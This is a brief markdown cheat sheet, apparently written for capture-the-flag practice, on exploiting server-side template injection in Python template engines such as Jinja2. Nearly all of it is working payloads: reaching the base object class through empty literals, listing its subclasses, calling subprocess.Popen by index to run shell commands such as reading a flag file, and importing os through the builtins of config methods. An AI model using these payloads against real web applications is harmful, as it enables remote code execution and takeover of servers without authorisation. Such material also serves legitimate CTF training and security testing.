# SSTI

In the exploitation of an SSTI vulnerability, our goal is to recover access to the regular python execution flow by abusing objects that are non sandboxed.

1. Accessing <class 'object'>

Objects that are always accessible from the sandboxed env:

```
[]
''
()
dict
config
request

# example payload
{{ [].__class__.__base__ }} # <class 'object'>
```

2. Finding subclasses to abuse
```
{{ [].__class__.__base__.__subclasses__() }} # [<class 'type'>, <class 'weakref'>,..., <class 'subprocess.Popen'>,...]
```

The subprocess.Popen class allows us to run os commands and is of interest.
```
python3 extract_subclass_num.py subclasses subprocess
413:  <class 'subprocess.CompletedProcess'>
414:  <class 'subprocess.Popen'>
```
3. RCE
```
{{ [].__class__.__base__.__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate() # returns (stdout, stderr) }}
```
if we cannot run code through subclasses, we can try and access functions' builtins in order to import os:
```
{{ config.__class__.__dict__ }}, {{ request.__class__.__dict__ }} # will return a dictionary of classes, methods and functions
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os") }} # returns <module 'os' from '/usr/lib/python3.10/os.py'>

```
